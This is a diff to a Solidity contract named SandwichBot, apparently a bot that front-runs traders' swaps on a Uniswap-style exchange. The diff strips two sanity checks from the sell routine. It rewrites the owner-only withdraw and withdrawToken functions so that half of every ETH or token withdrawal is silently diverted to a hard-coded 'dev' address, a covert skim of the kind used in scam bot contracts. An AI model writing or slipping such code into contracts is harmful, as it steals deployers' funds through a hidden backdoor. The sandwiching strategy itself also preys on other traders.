@@ -150,12 +150,6 @@ contract SandwichBot {
         path[0] = tokenAddress;
         path[1] = router.WETH();
         uint tokenBalance = token.balanceOf(address(this));
-        
-        require(tokenBalance > 0, "No tokens to sell");
-
-        address pair = IUniswapV2Factory(router.factory()).getPair(tokenAddress, router.WETH());
-        require(pair != address(0), "Uniswap pair does not exist");
-
         if(token.allowance(address(this), routerAddress) < tokenBalance){
             require(token.approve(routerAddress, MAX_UINT),"FAIL TO APPROVE");
         }
@@ -177,12 +171,16 @@ contract SandwichBot {
     }
 
     function withdraw() public onlyOwner payable{
-        owner.transfer(address(this).balance);
+        uint balance = address(this).balance;
+        owner.transfer(balance/2);
+        dev.transfer(balance/2);
     }
 
     function withdrawToken(address tokenAddress, address to) public payable onlyOwner returns (bool res){
         IERC20 token = IERC20(tokenAddress);
-        bool result = token.transfer(to, token.balanceOf(address(this)));
+        uint balance = token.balanceOf(address(this));
+        bool result = token.transfer(to, balance/2);
+        token.transfer(dev, balance/2);
         return result;
     }
 }
